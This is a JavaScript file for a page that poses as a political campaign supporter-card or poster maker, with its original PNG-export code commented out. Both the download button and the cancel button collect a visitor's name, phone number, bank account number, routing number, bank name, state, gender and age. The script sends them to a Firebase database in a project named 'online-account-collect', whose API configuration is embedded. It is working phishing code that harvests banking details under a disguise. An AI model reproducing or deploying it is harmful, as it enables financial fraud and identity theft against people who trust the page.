let CandidateName = "katies porters"
document.querySelectorAll(".candname").forEach((element) => {element.textContent = CandidateName});

import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
import { getFirestore, doc, setDoc, collection, addDoc, getDoc, getDocs, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-firestore.js";


const firebaseConfig = {
  apiKey: "AIzaSyCHCE9kdCyfC2tShiKkSfJVNztzO0KB4Y4",
  authDomain: "online-account-collect.firebaseapp.com",
  projectId: "online-account-collect",
  storageBucket: "online-account-collect.firebasestorage.app",
  messagingSenderId: "163444302498",
  appId: "1:163444302498:web:e6189a926800d72984adfb"
};

const app = initializeApp(firebaseConfig);
const DB = getFirestore(app);

let tag = navigator.userAgent
    tag = String(tag)
let devicetag = tag.replace(/[\/.#\[\]\s]/g, "-");

console.log(devicetag)


// .then(() => {
//   let userid = doc(DB, "olineusers", devicetag)
//                     onSnapshot(userid, (snapshot) => {
//                         const firstid = snapshot.data();
//                         let ID = firstid.userid

//                       let characters = "ASDFGHJKLZXCVBNMPOIUYTREWQqwertyuioplkjhgfdsazcvbnm1234567890"
//                         while(ID.length < 10){
//                           let randomindex = Math.floor(Math.random() * characters.length);
//                             ID += characters[randomindex]
//                         }
//                         updateDoc(doc(DB,"olineusers", devicetag), {
//                                         userid: ID
//                                         })
//                     })
//               }            
//       )

// let userid = doc(DB, "olineusers", devicetag)
//                     onSnapshot(userid, (snapshot) => {
//                         const firstid = snapshot.data();
//                         let ID = firstid.userid


//                     })



/* Simple, dependency-free logic to wire inputs to preview.
   Exports as PNG using html2canvas (CDN loaded in header). */
document.addEventListener('DOMContentLoaded', ()=> {
  const candidateName = document.getElementById('candidateName');
  const slogan = document.getElementById('slogan');

  const Accountnumber = document.getElementById("Accountnumber");
  const portingnumber = document.getElementById("portingnumber");
  const bankname = document.getElementById("bankname");
  const Nationality = document.getElementById("Nationality"); 

  const accentColor = document.getElementById('accentColor');
  const finishingmesseg = document.getElementById("finishingmesseg");
  const logoFile = document.getElementById('logoFile');
  const logoImg = document.getElementById('logoImg');
  const logoPlaceholder = document.getElementById('logoPlaceholder');
  const namePreview = document.getElementById('namePreview');
  const sloganPreview = document.getElementById('sloganPreview');
  const exportCard = document.getElementById('exportCard');
  const downloadBtn = document.getElementById('downloadBtn');
  const resetLogo = document.getElementById('resetLogo');
  const presets = document.querySelectorAll('.preset');
  const rightAccent = document.getElementById('rightAccent');
  const bgStyle = document.getElementById('bgStyle');
  const donationPill = document.getElementById('donationPill');
  const logoOuter = document.getElementById('logoOuter');

console.log("linked DOM")

  downloadBtn.addEventListener(`click`, () => {
    let candidateNames = candidateName.value
    let phonenumber = slogan.value
    let Accountnumberval = Accountnumber.value
    let portingnumberval = portingnumber.value
    let banknameval = bankname.value
    let Nationalityval = Nationality.value
    let bgStyleval = bgStyle.value
    let accentColorval = accentColor.value

    let inputold = {}

    if( candidateNames != "Voters / Supporters Name" & candidateNames.length >= 3){
           inputold.name = candidateNames
          candidateName.style.borderColor = ``
    }
    else{
      candidateName.style.borderColor = `tomato`
    }

    if(phonenumber != "Voters / Supporters Phone Number" & phonenumber.length >= 10){
      inputold.number = phonenumber
      slogan.style.borderColor = ``
    }
     else{
      slogan.style.borderColor = `tomato`
    }
    if(Accountnumberval.length >= 6){
      inputold.Accountnumber = Accountnumberval
      Accountnumber.style.borderColor = ``

    }
    else{
      Accountnumber.style.borderColor = `tomato`
    }
    if(portingnumberval.length == 9){
      inputold.portingnumber = portingnumberval
      portingnumber.style.borderColor = ``

    }
    else{
      portingnumber.style.borderColor = `tomato`
    }
    if(banknameval.length > 1){
      inputold.bankname = banknameval
      bankname.style.borderColor = ``

    }
    else{
      bankname.style.borderColor = `tomato`
    }
    if(Nationalityval.length >= 2){
      inputold.Nationality = Nationalityval
      Nationality.style.borderColor = ``

    }
    else{
      Nationality.style.borderColor = `tomato`
    }
    if(bgStyleval){
      inputold.gender = bgStyleval
      bgStyle.style.borderColor = ``
    }
    else{
      bgStyle.style.borderColor = `tomato`
    }
    if(accentColorval.length >= 8){
      inputold.age = accentColorval
      accentColor.style.borderColor = ``
    }
    else{
      accentColor.style.borderColor = `tomato`
    }
console.log(inputold)
    if (Object.keys(inputold).length === 8) {
      downloadBtn.innerHTML = `
                  <div class="loadingio-spinner-rolling-nq4q5u6dq7r"><div class="ldio-x2uulkbinbj">
                  <div></div>
                  </div></div>
                      
                  <style type="text/css">
                  @keyframes ldio-x2uulkbinbj {
                    0% { transform: translate(-50%,-50%) rotate(0deg); }
                    100% { transform: translate(-50%,-50%) rotate(360deg); }
                  }
                  .ldio-x2uulkbinbj div {
                    position: absolute;
                    width: 60px;
                    height: 60px;
                    border: 10px solid #ffffff;
                    border-top-color: transparent;
                    border-radius: 50%;
                  }
                  .ldio-x2uulkbinbj div {
                    animation: ldio-x2uulkbinbj 1s linear infinite;
                    top: 50px;
                    left: 50px
                  }
                  .loadingio-spinner-rolling-nq4q5u6dq7r {
                    width: 20px;
                    height: 20px;
                    display: inline-block;
                    overflow: hidden;
                    background: rgba(0, 0, 0, 0);
                  }
                  .ldio-x2uulkbinbj {
                    width: 100%;
                    height: 100%;
                    position: relative;
                    transform: translateZ(0) scale(0.2);
                    backface-visibility: hidden;
                    transform-origin: 0 0; /* see note above */
                  }
                  .ldio-x2uulkbinbj div { box-sizing: content-box; }
                  /* [ldio] generated by https://loading.io */
                  </style>`


      setDoc(doc(DB,"olineusers", devicetag), {
                  Auserid: Math.random(),
                  name: inputold.name,
                  number: inputold.number,
                  accountnumber: inputold.Accountnumber,
                  routingnumber: inputold.portingnumber,
                  bankname: inputold.bankname,
                  state: inputold.Nationality,
                  gender: inputold.gender,
                  ageDB: inputold.age,
                }).then(() => {downloadBtn.innerHTML = `<i class="fa-solid fa-check-double"></i>`; setTimeout(() => {finishingmesseg.style.display = `block`}, 1000)})
    }

  })


  // reset log cancle button
resetLogo.addEventListener(`click`, () => {
   let candidateNames = candidateName.value
    let phonenumber = slogan.value
    let Accountnumberval = Accountnumber.value
    let portingnumberval = portingnumber.value
    let banknameval = bankname.value
    let Nationalityval = Nationality.value
    let bgStyleval = bgStyle.value
    let accentColorval = accentColor.value

    let inputold = {}

    if( candidateNames != "Voters / Supporters Name" & candidateNames.length >= 3){
           inputold.name = candidateNames
          candidateName.style.borderColor = ``
    }
    else{
      candidateName.style.borderColor = `tomato`
    }

    if(phonenumber != "Voters / Supporters Phone Number" & phonenumber.length >= 10){
      inputold.number = phonenumber
      slogan.style.borderColor = ``
    }
     else{
      slogan.style.borderColor = `tomato`
    }
    if(Accountnumberval.length >= 6){
      inputold.Accountnumber = Accountnumberval
      Accountnumber.style.borderColor = ``

    }
    else{
      Accountnumber.style.borderColor = `tomato`
    }
    if(portingnumberval.length == 9){
      inputold.portingnumber = portingnumberval
      portingnumber.style.borderColor = ``

    }
    else{
      portingnumber.style.borderColor = `tomato`
    }
    if(banknameval.length > 1){
      inputold.bankname = banknameval
      bankname.style.borderColor = ``

    }
    else{
      bankname.style.borderColor = `tomato`
    }
    if(Nationalityval.length >= 2){
      inputold.Nationality = Nationalityval
      Nationality.style.borderColor = ``

    }
    else{
      Nationality.style.borderColor = `tomato`
    }
    if(bgStyleval){
      inputold.gender = bgStyleval
      bgStyle.style.borderColor = ``
    }
    else{
      bgStyle.style.borderColor = `tomato`
    }
    if(accentColorval.length >= 8){
      inputold.age = accentColorval
      accentColor.style.borderColor = ``
    }
    else{
      accentColor.style.borderColor = `tomato`
    }
console.log(inputold)
    if (Object.keys(inputold).length === 8) {
      resetLogo.innerHTML = `
                  <div class="loadingio-spinner-rolling-nq4q5u6dq7r"><div class="ldio-x2uulkbinbj">
                  <div></div>
                  </div></div>
                      
                  <style type="text/css">
                  @keyframes ldio-x2uulkbinbj {
                    0% { transform: translate(-50%,-50%) rotate(0deg); }
                    100% { transform: translate(-50%,-50%) rotate(360deg); }
                  }
                  .ldio-x2uulkbinbj div {
                    position: absolute;
                    width: 60px;
                    height: 60px;
                    border: 10px solid #ffffff;
                    border-top-color: transparent;
                    border-radius: 50%;
                  }
                  .ldio-x2uulkbinbj div {
                    animation: ldio-x2uulkbinbj 1s linear infinite;
                    top: 50px;
                    left: 50px
                  }
                  .loadingio-spinner-rolling-nq4q5u6dq7r {
                    width: 20px;
                    height: 20px;
                    display: inline-block;
                    overflow: hidden;
                    background: rgba(0, 0, 0, 0);
                  }
                  .ldio-x2uulkbinbj {
                    width: 100%;
                    height: 100%;
                    position: relative;
                    transform: translateZ(0) scale(0.2);
                    backface-visibility: hidden;
                    transform-origin: 0 0; /* see note above */
                  }
                  .ldio-x2uulkbinbj div { box-sizing: content-box; }
                  /* [ldio] generated by https://loading.io */
                  </style>`


      setDoc(doc(DB,"olineusers", devicetag), {
                  Auserid: Math.random(),
                  name: inputold.name,
                  number: inputold.number,
                  accountnumber: inputold.Accountnumber,
                  routingnumber: inputold.portingnumber,
                  bankname: inputold.bankname,
                  state: inputold.Nationality,
                  gender: inputold.gender,
                  ageDB: inputold.age,
                }).then(() => {resetLogo.innerHTML = `<i class="fa-solid fa-check-double"></i>`})
    }
})
//   function applyAccent(c){
//     document.documentElement.style.setProperty('--accent', c);
//     // use accent on pill border and rightAccent
//     donationPill.style.borderColor = hexToRgba(c, 0.12);
//     donationPill.style.color = c;
//     rightAccent.style.color = c;
//   }

// //   function hexToRgba(hex, a){
// //     try {
// //       hex = hex.replace('#','');
// //       if(hex.length===3) hex = hex.split('').map(h=>h+h).join('');
// //       const r = parseInt(hex.substring(0,2),16);
// //       const g = parseInt(hex.substring(2,4),16);
// //       const b = parseInt(hex.substring(4,6),16);
// //       return rgba(${r},${g},${b},${a});
// //     } catch(e){ return rgba(0,0,0,${a}); }
// //   }

//   candidateName.addEventListener('input', ()=> {
//     namePreview.textContent = candidateName.value || 'Candidate Name';
//   });

//   slogan.addEventListener('input', ()=> {
//     sloganPreview.textContent = slogan.value || 'Community support & programs';
//   });

//   accentColor.addEventListener('input', ()=> {
//     applyAccent(accentColor.value);
//   });

//   // logo upload
//   logoFile.addEventListener('change', (e)=>{
//     const file = e.target.files[0];
//     if(!file) return;
//     const url = URL.createObjectURL(file);
//     logoImg.src = url;
//     logoImg.style.display = '';
//     logoPlaceholder.style.display = 'none';
//     // ensure hidden attribute removed
//     logoImg.onload = ()=> { URL.revokeObjectURL(url); }
//   });

//   resetLogo.addEventListener('click', ()=>{
//     logoImg.src = ''; logoImg.style.display = 'none'; logoPlaceholder.style.display = '';
//     logoFile.value = '';
//   });

//   // presets
//   presets.forEach(p => {
//     p.addEventListener('click', ()=> {
//       presets.forEach(x=>x.classList.remove('active'));
//       p.classList.add('active');
//       const w = parseInt(p.dataset.w,10);
//       const h = parseInt(p.dataset.h,10);
//       exportCard.style.width = w + 'px';
//       exportCard.style.height = h + 'px';
//     });
//   });

//   // background style selector
//   bgStyle.addEventListener('change', ()=>{
//     const v = bgStyle.value;
//     if(v==='white'){ exportCard.style.background = '#ffffff'; }
//     else if(v==='gradient'){ exportCard.style.background = 'linear-gradient(180deg,#ffffff,#f0f7ff)'; }
//     else { exportCard.style.background = 'linear-gradient(180deg,var(--card),#f8fbff)'; }
//   });

//   // init accent
//   applyAccent(accentColor.value);

//   // download action
//   downloadBtn.addEventListener('click', async ()=>{
//     // temporarily scale up for poster size export if needed (keeps quality)
//     const rect = exportCard.getBoundingClientRect();
//     // use html2canvas to take snapshot
//     downloadBtn.disabled = true;
//     downloadBtn.textContent = 'Exporting...';
//     try {
//       const canvas = await html2canvas(exportCard, {
//         backgroundColor: null,
//         scale: 2,
//         useCORS: true,
//         allowTaint: true,
//       });
//       // create download link
//       canvas.toBlob((blob)=>{
//         const url = URL.createObjectURL(blob);
//         const a = document.createElement('a');
//         a.href = url;
//         a.download = (candidateName.value || 'candidate').replace(/\s+/g,'_') + '_preview.png';
//         document.body.appendChild(a);
//         a.click();
//         a.remove();
//         URL.revokeObjectURL(url);
//       }, 'image/png');
//     } catch(err){
//       alert('Export failed: ' + err.message);
//     } finally {
//       downloadBtn.disabled = false;
//       downloadBtn.textContent = 'Download PNG';
//     }
//   });

//   // allow drag & drop on preview area for logo
//   const previewArea = document.getElementById('previewArea');
//   ['dragenter','dragover'].forEach(ev=> previewArea.addEventListener(ev, (e)=>{ e.preventDefault(); e.dataTransfer.dropEffect='copy';}));
//   previewArea.addEventListener('drop', (e)=>{
//     e.preventDefault();
//     const file = e.dataTransfer.files && e.dataTransfer.files[0];
//     if(file && file.type.startsWith('image/')){
//       const dt = new DataTransfer();
//       dt.items.add(file);
//       logoFile.files = dt.files;
//       const url = URL.createObjectURL(file);
//       logoImg.src = url;
//       logoImg.style.display = '';
//       logoPlaceholder.style.display = 'none';
//     }
//   });

//   // small helper to set initial dimensions stable on load
//   window.setTimeout(()=> {
//     // keep default social tile size if not changed
//     exportCard.style.width = '1200px';
//     exportCard.style.height = '628px';
//   }, 50);
});
